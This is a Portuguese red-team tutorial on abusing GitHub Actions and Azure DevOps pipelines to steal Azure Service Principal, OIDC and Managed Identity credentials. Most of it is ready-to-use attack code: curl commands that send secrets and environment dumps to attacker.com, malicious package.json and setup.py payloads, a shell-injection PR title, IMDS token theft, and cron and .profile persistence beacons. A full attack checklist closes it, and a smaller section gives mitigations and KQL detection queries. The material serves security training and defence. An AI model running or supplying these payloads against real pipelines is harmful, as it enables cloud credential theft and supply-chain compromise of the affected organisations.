---
title: "Azure CI/CD Abuse"
---

# 06 - GitHub Actions e Abuso de CI/CD no Contexto Azure

## Pipeline é Superfície de Ataque, Não Só Dev Infra

Pipelines de CI/CD são frequentemente tratados como infraestrutura de desenvolvimento, não como superfície de ataque. Esse erro custa caro: pipelines têm acesso direto a secrets de produção, credenciais cloud, tokens de Service Principal e permissões OIDC que permitem autenticação no Azure sem senha. Pra red teamer, comprometer pipeline é comprometer a chave do reino — os mesmos segredos que o pipeline usa pra deploy o operador usa pra acessar, modificar ou destruir recursos Azure.

Cadeia típica: repositório GitHub com workflow mal configurado → exfiltração de secrets → acesso a Service Principal Azure → escalonamento em recursos ARM ou Entra ID.

---

## Fundamentos: Como CI/CD Armazena Credenciais Azure

### Tipos de Credenciais Comuns em Pipelines

```
Pipeline CI/CD
├── GitHub Actions Secrets (repositório/ambiente/organização)
│   ├── AZURE_CLIENT_ID
│   ├── AZURE_CLIENT_SECRET
│   ├── AZURE_TENANT_ID
│   ├── AZURE_SUBSCRIPTION_ID
│   └── AZURE_CREDENTIALS (JSON completo com SP)
├── Azure DevOps Variable Groups
│   ├── Library → Variable Groups (vinculados a Key Vault)
│   └── Service Connections (armazenam SP ou MI)
├── OIDC Federation (sem secret, token temporário)
│   └── Federated Identity Credential no App Registration
└── Self-Hosted Runner com Managed Identity
    └── IMDS endpoint acessível pelo runner
```

### Por Que São Alvos Valiosos

- `AZURE_CREDENTIALS` em formato JSON contém `clientId`, `clientSecret`, `tenantId`, `subscriptionId` — tudo para autenticar como Service Principal
- Service Connections no Azure DevOps encapsulam credenciais e são usadas diretamente por tarefas sem expor o secret ao pipeline
- Runners self-hosted rodando em VMs Azure herdam a Managed Identity da VM — sem credencial estática, mas com acesso ao IMDS

---

## GitHub Actions — Exposição de Secrets

### Hierarquia de Secrets no GitHub

```
Organização
└── Repositório
    └── Environment (Production, Staging...)
        └── Secret específico de ambiente
```

- **Organization secrets**: disponíveis para todos os repos da org (se configurado)
- **Repository secrets**: disponíveis em todos os workflows do repo
- **Environment secrets**: disponíveis apenas quando o job referencia aquele ambiente — podem exigir aprovação manual (protection rules)

### GITHUB_TOKEN — O Token Nativo

Todo workflow recebe automaticamente um `GITHUB_TOKEN` com escopo limitado ao repositório. Por padrão tem permissão `read` na maioria dos recursos, mas pode ser elevado:

```yaml
# Workflow com permissões excessivas — alvo de ataque
permissions:
  contents: write
  packages: write
  id-token: write    # CRÍTICO: permite solicitar OIDC token
  pull-requests: write
```

**O que um atacante pode fazer com GITHUB_TOKEN elevado:**
- Fazer push de código malicioso (contents: write)
- Publicar pacotes comprometidos (packages: write)
- Solicitar OIDC token para autenticar em Azure (id-token: write)
- Aprovar e mergear PRs (pull-requests: write)

### Leitura de Secrets em Logs — Exfiltração Direta

Secrets nunca devem aparecer em logs, mas erros de configuração expõem isso:

```yaml
# VULNERÁVEL: imprime secret em log
- name: Debug credentials
  run: echo "Token: ${{ secrets.AZURE_CLIENT_SECRET }}"

# VULNERÁVEL: passa secret como argumento visível
- name: Login Azure
  run: az login --service-principal -u $CLIENT_ID -p ${{ secrets.CLIENT_SECRET }} --tenant $TENANT_ID

# SEGURO: usa action oficial que mascara o valor
- uses: azure/login@v2
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

**Técnica de exfiltração via encoding para burlar mascaramento:**

```bash
# O GitHub mascara o valor exato do secret, mas não variações encoded
echo $AZURE_CLIENT_SECRET | base64
echo $AZURE_CLIENT_SECRET | xxd | head
# Alternativa: exfiltrar via DNS ou HTTP para servidor controlado
curl "https://attacker.com/exfil?d=$(echo $SECRET | base64 | tr -d '\n')"
```

---

## Injeção em Workflow Files — pull_request_target

### O Problema do pull_request_target

O trigger `pull_request_target` executa no contexto do repositório **base** (não do fork), com acesso total a secrets. Foi criado para permitir que PRs de forks adicionem comentários e labels, mas quando mal usado abre injeção de código:

```yaml
# VULNERÁVEL: trigger perigoso + checkout do PR
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # PERIGO: faz checkout do código do PR (não confiável)
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      # Executa código do atacante com acesso a secrets do repo base
      - name: Run tests
        run: npm test
      
      # Secrets disponíveis aqui — acessíveis ao código do PR
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
```

**Fluxo de ataque:**
1. Atacante faz fork do repositório alvo
2. Modifica `package.json` → script `test` exfiltra `AZURE_CLIENT_ID` e `AZURE_CLIENT_SECRET`
3. Abre Pull Request
4. Workflow `pull_request_target` executa com secrets do repo base
5. Credenciais Azure exfiltradas para servidor do atacante

### Padrão de Ataque em npm/pip Scripts

```json
// package.json malicioso no fork
{
  "scripts": {
    "test": "curl -s https://attacker.com/collect -d \"$(env | base64)\""
  }
}
```

```python
# setup.py malicioso
import os, urllib.request
urllib.request.urlopen(
    'https://attacker.com/collect',
    data=str(os.environ).encode()
)
```

### Injeção via Expressões de Contexto

Dados controlados pelo atacante injetados diretamente em comandos shell:

```yaml
# VULNERÁVEL: título do PR usado em comando shell
- name: Check PR title
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # Atacante nomeia PR: "; curl https://attacker.com/$(cat /proc/1/environ | base64)"
```

**Mitigação correta — uso de variável de ambiente intermediária:**

```yaml
- name: Check PR title (seguro)
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # $PR_TITLE é tratado como dado, não como código shell
```

---

## Comprometimento de Self-Hosted Runners

### Por Que São Críticos

Runners self-hosted geralmente rodam em:
- VMs Azure com Managed Identity atribuída
- Containers com montagem de secrets
- Máquinas on-premises com acesso a redes internas

Um job malicioso executando em runner self-hosted tem acesso a tudo que o runner tem.

### Identificando Runners Self-Hosted

```yaml
# Procure em workflows por labels não-padrão
runs-on: self-hosted
runs-on: [self-hosted, linux, azure]
runs-on: [self-hosted, production]
```

### Abuso via Job Malicioso em Fork

```yaml
# Workflow em repositório público com runner self-hosted vulnerável
on:
  pull_request:

jobs:
  build:
    runs-on: self-hosted  # executa em infra interna
    steps:
      - uses: actions/checkout@v4
      - run: make build
      # Atacante injeta: curl http://169.254.169.254/metadata/identity/...
```

### Acesso ao IMDS em Runner Azure

Se o runner roda em VM Azure com Managed Identity:

```bash
# Dentro do job malicioso — acessa IMDS para obter token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?\
api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Usa token para enumerar recursos
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Exfiltra token para servidor controlado
curl -X POST https://attacker.com/token -d "token=$TOKEN"
```

### Persistência em Runner Self-Hosted

```bash
# Após comprometer o runner, instalar cron para manter acesso
echo "*/5 * * * * /tmp/.hidden/beacon.sh" | crontab -
# Ou instalar hook no diretório do runner
echo 'curl https://attacker.com/checkin &' >> ~/.profile
```

---

## Credenciais Azure Service Principal em CI/CD

### Formatos Comuns de AZURE_CREDENTIALS

```json
// Formato JSON completo usado pela azure/login action
{
  "clientId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "clientSecret": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "subscriptionId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "activeDirectoryEndpointUrl": "https://login.microsoftonline.com",
  "resourceManagerEndpointUrl": "https://management.azure.com/",
  "activeDirectoryGraphResourceId": "https://graph.windows.net/",
  "sqlManagementEndpointUrl": "https://management.core.windows.net:8443/",
  "galleryEndpointUrl": "https://gallery.azure.com/",
  "managementEndpointUrl": "https://management.core.windows.net/"
}
```

### Usando Credenciais Exfiltradas

```bash
# Autenticar como Service Principal com credenciais roubadas
az login --service-principal \
  --username "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" \
  --password "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
  --tenant "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Verificar identidade atual
az account show

# Listar recursos acessíveis
az resource list --output table

# Verificar permissões do SP
az role assignment list --assignee <CLIENT_ID> --all
```

---

## Azure DevOps — Ataques em Pipelines

### Estrutura do Azure DevOps

```
Organization
└── Project
    ├── Pipelines (YAML ou Classic)
    ├── Library
    │   ├── Variable Groups
    │   │   ├── Variáveis inline (com/sem segredo)
    │   │   └── Link para Azure Key Vault
    │   └── Secure Files
    └── Service Connections
        ├── Azure Resource Manager (ARM)
        ├── GitHub
        └── Docker Registry
```

### Variable Groups — Extração de Secrets

Variable Groups são vinculados a pipelines e podem conter secrets. Se você tem acesso de edição ao pipeline:

```yaml
# pipeline.yml — Variable Group referenciada
variables:
  - group: Production-Credentials

steps:
  - script: |
      # Variáveis do grupo disponíveis como variáveis de ambiente
      echo "Client ID: $(AZURE_CLIENT_ID)"
      # Para exfiltrar (atacante modifica o pipeline):
      curl https://attacker.com/exfil?data=$(AZURE_CLIENT_SECRET | base64)
```

**Via REST API do Azure DevOps:**

```bash
# Listar variable groups (requer PAT com permissão de leitura)
curl -u ":$PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/distributedtask/variablegroups?api-version=7.1"

# Variable groups linkados ao Key Vault mostram nomes mas não valores
# Os valores são resolvidos em runtime pelo pipeline
```

### Service Connections — Abuso

```bash
# Listar service connections via REST API
curl -u ":$PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints?api-version=7.1"

# Service connections do tipo AzureRM contêm:
# - servicePrincipalId (clientId)
# - servicePrincipalKey (clientSecret) — mascarado na API, mas usado em runtime

# Verificar permissões da service connection
curl -u ":$PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints/{endpointId}/executionhistory?api-version=7.1"
```

### Modificação de Pipeline para Exfiltrar Secrets

Se você tem acesso de Contributor ao repositório vinculado ao Azure DevOps:

```yaml
# Modificação maliciosa do pipeline YAML
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: 'Production-ServiceConnection'
      scriptType: 'bash'
      scriptLocation: 'inlineScript'
      inlineScript: |
        # A task autentica usando a service connection
        # Uma vez autenticado, exfiltre o token atual
        TOKEN=$(az account get-access-token --query accessToken -o tsv)
        curl -X POST https://attacker.com/token -d "token=$TOKEN"
        
        # Ou dump das variáveis de ambiente que contêm secrets resolvidos
        env | base64 | curl -X POST https://attacker.com/env --data-binary @-
```

### Extração de Secrets de Logs de Pipeline

Logs de builds podem conter informações sensíveis quando mascaramento falha:

```bash
# Via REST API — baixar logs de builds
curl -u ":$PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/build/builds/{buildId}/logs?api-version=7.1"

# Download de log específico
curl -u ":$PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/build/builds/{buildId}/logs/{logId}?api-version=7.1"

# Buscar padrões em logs baixados
grep -iE "(password|secret|key|token|credential)" build_log.txt
grep -iE "[a-zA-Z0-9]{40,}" build_log.txt  # Possíveis tokens/secrets
```

---

## OIDC Token Abuse — Autenticação Cloud Sem Senha

### Como Funciona o OIDC Federation

OIDC (OpenID Connect) permite que workflows CI/CD autentiquem em Azure sem armazenar credenciais estáticas. O fluxo é:

```
GitHub Actions                 Entra ID (Azure AD)
     │                               │
     │ 1. Solicita OIDC token        │
     │──────────────────────────────>│
     │                               │
     │ 2. JWT assinado pela GitHub   │
     │<──────────────────────────────│
     │                               │
     │ 3. Troca JWT por access token │
     │──────────────────────────────>│
     │   (federated identity check)  │
     │                               │
     │ 4. Access token Azure         │
     │<──────────────────────────────│
     │                               │
     │ 5. Acessa recursos ARM/Graph  │
     ▼                               ▼
```

### Configuração Legítima (para referência)

```yaml
# App Registration no Azure com Federated Credential configurada para:
# Issuer: https://token.actions.githubusercontent.com
# Subject: repo:org/repo:ref:refs/heads/main
# Ou: repo:org/repo:environment:production

# Workflow usando OIDC
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
          # Sem client-secret! Usa OIDC automaticamente
```

### Abuso de OIDC — Condições para Exploração

Para abusar do OIDC, o atacante precisa satisfazer as condições da Federated Credential:

```
Federated Credential configurada com:
  Subject: repo:target-org/target-repo:ref:refs/heads/main

Atacante precisa de:
  - Capacidade de executar workflow no contexto correto
  - Acesso de push/merge para branch main
  - OU: Federated Credential com subject muito permissivo
```

**Federated Credentials permissivas (vulneráveis):**

```
# Muito permissivo — qualquer branch/PR do repo
Subject: repo:target-org/target-repo:*

# Permite qualquer ambiente
Subject: repo:target-org/target-repo:environment:*

# Configuração sem subject filter — aceita qualquer claim
```

### Solicitando OIDC Token Manualmente

```bash
# Dentro de um workflow com permissão id-token: write
OIDC_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

# Decodificar o JWT para ver os claims (sub, iss, aud, etc.)
echo $OIDC_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Trocar o OIDC token por access token Azure
curl -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "client_id=$CLIENT_ID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC_TOKEN" \
  -d "scope=https://management.azure.com/.default" \
  -d "requested_token_use=on_behalf_of"
```

### Ataque Completo: OIDC via pull_request_target

```yaml
# Workflow vulnerável em repositório público com OIDC configurado
on:
  pull_request_target:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    environment: production  # Tem federated credential configurada
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checkout do fork!
      
      - uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
      
      - run: npm test  # Executa código do fork com token Azure válido!
```

**Payload no fork (package.json):**

```json
{
  "scripts": {
    "test": "TOKEN=$(az account get-access-token --query accessToken -o tsv) && curl -X POST https://attacker.com/azure -d \"token=$TOKEN\""
  }
}
```

---

## Enumeração de Repositórios e Workflows

### Buscando Workflows Vulneráveis

```bash
# Listar repositórios de uma organização (autenticado)
gh api "orgs/{org}/repos" --paginate | jq '.[].name'

# Listar workflows de um repositório
gh api "repos/{org}/{repo}/actions/workflows" | jq '.workflows[].path'

# Baixar arquivo de workflow
gh api "repos/{org}/{repo}/contents/.github/workflows/deploy.yml" \
  | jq -r '.content' | base64 -d

# Buscar por workflows com pull_request_target
gh api "repos/{org}/{repo}/actions/workflows" --paginate \
  | jq -r '.workflows[].path' | while read wf; do
    content=$(gh api "repos/{org}/{repo}/contents/$wf" | jq -r '.content' | base64 -d)
    echo "$content" | grep -q "pull_request_target" && echo "VULNERABLE: $wf"
  done

# Listar secrets de repositório (requer permissão admin)
gh api "repos/{org}/{repo}/actions/secrets" | jq '.secrets[].name'

# Listar secrets de organização
gh api "orgs/{org}/actions/secrets" | jq '.secrets[].name'
```

### Ferramentas para Análise de Workflows

```bash
# Poutine — análise estática de workflows GitHub Actions
poutine analyze-repo org/repo --token $GH_TOKEN

# Semgrep com regras específicas para Actions
semgrep --config p/github-actions .github/workflows/

# Gato (GitHub Actions Tester/Offensive)
gato -s enumerate -t org/repo
gato -s attack -t org/repo --workflow deploy.yml
```

---

## Técnicas de Detecção (Perspectiva do Defensor)

| Indicador | Onde Verificar | Descrição |
|-----------|---------------|-----------|
| Job com `env \| base64` | Logs do pipeline | Tentativa de exfiltrar variáveis |
| Checkout de SHA específico em pull_request_target | YAML do workflow | Indica possível injeção de código de fork |
| Requisição OIDC fora de horário normal | Entra ID Sign-in Logs | Token solicitado por pipeline suspeito |
| SP com autenticação de IP incomum | Entra ID Sign-in Logs | Credenciais do SP usadas fora do pipeline |
| Variable Group acessada por pipeline não autorizado | Azure DevOps Audit | Acesso indevido a secrets |
| Runner self-hosted fazendo conexões de saída incomuns | Network logs | Possível exfiltração de dados |

### Queries KQL para Detecção

```kusto
// Sign-ins de Service Principal do CI/CD em IPs incomuns
SigninLogs
| where AppId == "<SP_CLIENT_ID>"
| where IPAddress !in (known_pipeline_ips)
| project TimeGenerated, UserPrincipalName, IPAddress, ResultType, ClientAppUsed

// Acesso ao Key Vault fora de horário de pipeline
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName == "SecretGet"
| where TimeGenerated !between(datetime(08:00) .. datetime(20:00))
| where CallerIPAddress !in (known_pipeline_ips)

// OIDC token exchange incomum
AADServicePrincipalSignInLogs
| where AuthenticationProtocol == "federated"
| where ResourceDisplayName == "Windows Azure Service Management API"
| summarize count() by ServicePrincipalName, IPAddress, bin(TimeGenerated, 1h)
```

---

## Checklist de Ataque CI/CD Azure

```
RECONHECIMENTO
[ ] Identificar repositórios com workflows .github/workflows/
[ ] Procurar triggers: pull_request_target, workflow_dispatch, push para main
[ ] Verificar se há secrets referenciados: ${{ secrets.AZURE_* }}
[ ] Identificar runners self-hosted: runs-on: self-hosted
[ ] Verificar configuração OIDC: id-token: write + azure/login sem secret

EXPLORAÇÃO
[ ] pull_request_target + checkout de fork + npm/pip scripts maliciosos
[ ] Injeção via expressão de contexto não sanitizada (${{ github.event.*.title }})
[ ] Runner self-hosted → acesso IMDS → token Managed Identity
[ ] Azure DevOps: modificar pipeline para exfiltrar token durante execução

PÓS-COMPROMETIMENTO
[ ] Usar credenciais Azure obtidas para enumerar recursos (az resource list)
[ ] Verificar role assignments do SP comprometido
[ ] Acessar Key Vaults referenciados pelo pipeline
[ ] Mover lateralmente para outros recursos ARM ou Entra ID
[ ] Verificar se SP tem permissões de Graph API (User.ReadWrite.All, etc.)
```

---

## Leitura Complementar

- Securitylab GitHub — Vulnerabilidades em Actions — https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- OWASP Top 10 CI/CD Security Risks — https://owasp.org/www-project-top-10-ci-cd-security-risks/
- Poutine (Pipeline Security Scanner) — https://github.com/boostsecurityio/poutine
- Gato (GitHub Actions Testing Offensive) — https://github.com/praetorian-inc/gato
- Azure OIDC Federation Docs — https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation
- [CARTE - Altered Security Azure Red Team Expert (2025)](https://www.alteredsecurity.com/azureadlab)
